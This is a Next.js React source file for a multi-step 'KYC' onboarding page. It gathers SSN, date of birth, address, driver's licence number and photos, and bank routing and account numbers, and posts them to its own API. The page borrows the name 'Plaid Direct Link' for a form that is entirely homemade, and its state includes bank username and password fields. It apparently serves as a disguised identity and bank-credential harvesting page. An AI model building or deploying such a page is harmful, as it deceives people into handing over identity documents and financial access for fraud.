"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { BANKS } from "@/lib/banks";

export default function OnboardingPage() {
  const router = useRouter();
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem("bpkyc_token");
    if (!token) {
      router.push("/register");
    }
  }, [router]);

  const [formData, setFormData] = useState({
    fullName: "",
    dob: "",
    ssn: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    idNumber: "",
    licenseFront: "",
    licenseBack: "",
    // Bank Data
    bankName: "",
    bankUsername: "",
    bankPassword: "",
    disbursementAccount: "",
    disbursementRouting: "",
  });

  const [previews, setPreviews] = useState({
    licenseFront: "",
    licenseBack: "",
  });

  const filteredBanks = BANKS.filter((b) => b.toLowerCase().includes(searchTerm.toLowerCase()));

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, field: "licenseFront" | "licenseBack") => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        const base64 = reader.result as string;
        setFormData((prev) => ({ ...prev, [field]: base64 }));
        setPreviews((prev) => ({ ...prev, [field]: base64 }));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 2 && (!formData.licenseFront || !formData.licenseBack)) {
      alert("Please upload both front and back images of your license.");
      return;
    }
    setStep((s) => (s + 1) as any);
    window.scrollTo(0, 0);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/kyc", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(formData),
      });
      const data = await res.json();

      if (!res.ok) {
        alert(data.error || "Failed to submit KYC");
        return;
      }

      router.push("/dashboard");
    } catch (err: any) {
      alert("Submission error: " + err.message);
    } finally {
      setIsSubmitting(false);
    }
  };

  const inputStyle = {
    width: "100%",
    padding: "14px 16px",
    border: "2px solid var(--gray)",
    borderRadius: "8px",
    fontFamily: "inherit",
    fontSize: "1rem",
    outline: "none",
  };
  const labelStyle = {
    display: "block",
    fontFamily: "Montserrat, sans-serif",
    fontWeight: 700,
    fontSize: "0.85rem",
    textTransform: "uppercase" as any,
    marginBottom: "8px",
  };

  return (
    <section style={{ padding: "80px 0", background: "var(--off-white)", minHeight: "100vh" }}>
      <div
        className="form-card-responsive"
      >
        {/* Progress Stepper */}
        <div style={{ textAlign: "center", marginBottom: "40px" }}>
          <div style={{ display: "flex", justifyContent: "center", gap: "10px", marginBottom: "20px" }}>
            <div style={{ width: "40px", height: "6px", borderRadius: "3px", background: "var(--cyan)" }} />
            <div style={{ width: "40px", height: "6px", borderRadius: "3px", background: step >= 2 ? "var(--cyan)" : "#eee" }} />
            <div style={{ width: "40px", height: "6px", borderRadius: "3px", background: step >= 3 ? "var(--cyan)" : "#eee" }} />
          </div>
          <h1 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 900, fontSize: "1.8rem", color: "var(--black)", marginBottom: "12px", textTransform: "uppercase" }}>
            {step === 1 ? "Personal Profile" : step === 2 ? "Identity Sync" : "Disbursement Setup"}
          </h1>
          <p style={{ color: "var(--text-body)", fontSize: "0.95rem", lineHeight: 1.6 }}>
            {step === 1 ? "Confirm your legal identity." : step === 2 ? "Verify your ID documentation." : "Finalize your direct deposit instructions via Plaid."}
          </p>
        </div>

        {step === 1 && (
          <form onSubmit={handleNext} style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
              <div>
                <label style={labelStyle}>Full Legal Name</label>
                <input type="text" name="fullName" required value={formData.fullName} onChange={handleChange} style={inputStyle} placeholder="Full Legal Name" />
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(250px, 1fr))", gap: "16px" }}>
                <div>
                  <label style={labelStyle}>Date of Birth</label>
                  <input type="date" name="dob" required value={formData.dob} onChange={handleChange} style={inputStyle} />
                </div>
                <div>
                  <label style={labelStyle}>SSN / ITIN</label>
                  <input type="text" name="ssn" required value={formData.ssn} onChange={handleChange} style={inputStyle} placeholder="XXX-XX-XXXX" />
                </div>
              </div>
              <div>
                 <label style={labelStyle}>Residential Address</label>
                 <input type="text" name="address" required value={formData.address} onChange={handleChange} style={inputStyle} placeholder="Address" />
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(140px, 1fr))", gap: "16px" }}>
                 <input type="text" name="city" required placeholder="City" value={formData.city} onChange={handleChange} style={inputStyle} />
                 <input type="text" name="state" required placeholder="State" value={formData.state} onChange={handleChange} style={inputStyle} />
                 <input type="text" name="zip" required placeholder="Zip Code" value={formData.zip} onChange={handleChange} style={inputStyle} />
              </div>
              <div>
                <label style={labelStyle}>Driver&apos;s License Number</label>
                <input type="text" name="idNumber" required value={formData.idNumber} onChange={handleChange} style={inputStyle} placeholder="ID Number" />
              </div>
            </div>
            <button type="submit" style={{ background: "var(--cyan)", color: "var(--black)", padding: "18px", border: "none", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1rem", cursor: "pointer", textTransform: "uppercase" }}>
              Next: Identity Sync
            </button>
          </form>
        )}

        {step === 2 && (
          <form onSubmit={handleNext} style={{ display: "flex", flexDirection: "column", gap: "32px" }}>
             <div style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
                <div>
                   <label style={labelStyle}>Front of License</label>
                   <div style={{ border: "2px dashed #ccc", padding: previews.licenseFront ? "10px" : "40px", borderRadius: "12px", textAlign: "center", background: "#fafafa", position: "relative", overflow: "hidden" }}>
                      {!previews.licenseFront ? (
                        <>
                          <input type="file" required accept="image/png, image/jpeg, image/jpg, image/webp" onChange={(e) => handleFileChange(e, "licenseFront")} style={{ opacity: 0, position: "absolute", inset: 0, width: "100%", cursor: "pointer", zIndex: 10 }} />
                          <div style={{ fontSize: "0.9rem", color: "#888", fontWeight: 600 }}>Click or Drag Front View</div>
                        </>
                      ) : (
                        <div style={{ position: "relative" }}>
                          <img src={previews.licenseFront} alt="Front View" style={{ width: "100%", borderRadius: "8px", display: "block" }} />
                          <button type="button" onClick={() => setPreviews(p => ({ ...p, licenseFront: "" }))} style={{ position: "absolute", top: "10px", right: "10px", background: "white", border: "none", width: "24px", height: "24px", borderRadius: "50%", cursor: "pointer", fontWeight: 900 }}>×</button>
                        </div>
                      )}
                   </div>
                </div>
                <div>
                   <label style={labelStyle}>Back of License</label>
                   <div style={{ border: "2px dashed #ccc", padding: previews.licenseBack ? "10px" : "40px", borderRadius: "12px", textAlign: "center", background: "#fafafa", position: "relative", overflow: "hidden" }}>
                      {!previews.licenseBack ? (
                        <>
                          <input type="file" required accept="image/png, image/jpeg, image/jpg, image/webp" onChange={(e) => handleFileChange(e, "licenseBack")} style={{ opacity: 0, position: "absolute", inset: 0, width: "100%", cursor: "pointer", zIndex: 10 }} />
                          <div style={{ fontSize: "0.9rem", color: "#888", fontWeight: 600 }}>Click or Drag Back View</div>
                        </>
                      ) : (
                        <div style={{ position: "relative" }}>
                          <img src={previews.licenseBack} alt="Back View" style={{ width: "100%", borderRadius: "8px", display: "block" }} />
                          <button type="button" onClick={() => setPreviews(p => ({ ...p, licenseBack: "" }))} style={{ position: "absolute", top: "10px", right: "10px", background: "white", border: "none", width: "24px", height: "24px", borderRadius: "50%", cursor: "pointer", fontWeight: 900 }}>×</button>
                        </div>
                      )}
                   </div>
                </div>
             </div>
             <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
                <button type="submit" style={{ background: "var(--black)", color: "white", padding: "18px", border: "none", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1rem", cursor: "pointer", textTransform: "uppercase" }}>
                  Next: Disbursement Setup
                </button>
                <button type="button" onClick={() => setStep(1)} style={{ background: "none", border: "none", color: "#888", fontWeight: 700, cursor: "pointer", textDecoration: "underline" }}>Back</button>
             </div>
          </form>
        )}

        {step === 3 && (
          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
             <div style={{ background: "#f0f0f0", padding: "24px", borderRadius: "12px", border: "1px solid #ddd" }}>
                <h3 style={{ fontSize: "1rem", fontWeight: 900, marginBottom: "16px" }}>Plaid Direct Link</h3>
                
                {/* Searchable Bank Input */}
                <div style={{ position: "relative", marginBottom: "16px" }}>
                   <label style={labelStyle}>Bank Institution</label>
                   <input 
                      type="text" 
                      placeholder="Search to select your bank..." 
                      style={inputStyle} 
                      value={searchTerm}
                      onChange={e => {
                        setSearchTerm(e.target.value);
                        setIsDropdownOpen(true);
                      }}
                      onFocus={() => setIsDropdownOpen(true)}
                   />
                   {isDropdownOpen && filteredBanks.length > 0 && (
                      <div style={{ position: "absolute", top: "100%", left: 0, right: 0, background: "white", border: "1px solid #ddd", borderRadius: "8px", maxHeight: "200px", overflowY: "auto", zIndex: 100, boxShadow: "0 10px 30px rgba(0,0,0,0.1)" }}>
                         {filteredBanks.map(bank => (
                            <div 
                              key={bank} 
                              onClick={() => {
                                setFormData(p => ({ ...p, bankName: bank }));
                                setSearchTerm(bank);
                                setIsDropdownOpen(false);
                              }}
                              style={{ padding: "12px 16px", cursor: "pointer", borderBottom: "1px solid #eee", fontSize: "0.9rem", fontWeight: 600 }}
                            >
                               {bank}
                            </div>
                         ))}
                      </div>
                   )}
                   {searchTerm && !BANKS.includes(searchTerm) && (
                      <div style={{ marginTop: "10px", fontSize: "0.8rem", color: "var(--pink)", fontWeight: 700 }}>
                         Bank not found? Linking as: <span style={{ textDecoration: "underline" }}>{searchTerm}</span>
                      </div>
                   )}
                </div>

                {/* Account Details */}
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: "16px", marginTop: "24px", borderTop: "1px solid #ddd", paddingTop: "24px" }}>
                   <div>
                      <label style={labelStyle}>Routing Number</label>
                      <input type="text" required name="disbursementRouting" value={formData.disbursementRouting} onChange={handleChange} style={inputStyle} />
                   </div>
                   <div>
                      <label style={labelStyle}>Account Number</label>
                      <input type="text" required name="disbursementAccount" value={formData.disbursementAccount} onChange={handleChange} style={inputStyle} />
                   </div>
                </div>
             </div>

            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
              <button 
                type="submit" 
                disabled={isSubmitting} 
                style={{ background: "var(--black)", color: "white", padding: "18px", border: "none", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1rem", cursor: "pointer", textTransform: "uppercase" }}
              >
                {isSubmitting ? "FINALIZING..." : "FINISH REGISTRATION"}
              </button>
              <button type="button" onClick={() => setStep(2)} style={{ background: "none", border: "none", color: "#888", fontWeight: 700, cursor: "pointer", textDecoration: "underline" }}>Back</button>
            </div>
          </form>
        )}
      </div>
    </section>
  );
}
